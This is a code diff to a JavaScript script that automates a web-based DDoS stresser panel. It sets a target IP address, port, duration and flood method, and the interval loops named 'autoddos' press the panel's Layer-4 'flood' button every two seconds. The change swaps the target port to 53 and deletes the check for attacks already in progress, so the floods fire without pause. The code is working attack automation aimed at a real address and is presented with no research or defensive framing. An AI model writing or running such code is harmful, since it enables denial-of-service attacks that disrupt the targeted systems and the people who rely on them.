@@ -21,11 +21,11 @@
 // index 6 = ACK
 
 var iptarget1="103.222.255.36";
-var porttarget1="123";
+var porttarget1="53";
 var waktu1="120";
-var methode1="2"
+var methode1="0"
 
-var iptarget2="103.222.255.36";
+var iptarget2="";
 var porttarget2="123";
 var waktu2="120";
 var methode2="1"
@@ -38,9 +38,9 @@ var autoddos1 = setInterval(function (){
     document.getElementById("portL4").value = porttarget1
     document.getElementById("timeL4").value = waktu1
     document.getElementById("methodL4").selectedIndex = methode1
-    if(document.getElementById("attacksinprogress").textContent.length == 0){
+
         L4btn('flood', '');
-    }
+
 },2000)
 
 var autoddos2 = setInterval(function (){
@@ -51,7 +51,7 @@ var autoddos2 = setInterval(function (){
     document.getElementById("portL4").value = porttarget2
     document.getElementById("timeL4").value = waktu2
     document.getElementById("methodL4").selectedIndex = methode2
-    if(document.getElementById("attacksinprogress").textContent.length == 0){
+
         L4btn('flood', '');
-    }
+
 },2000)
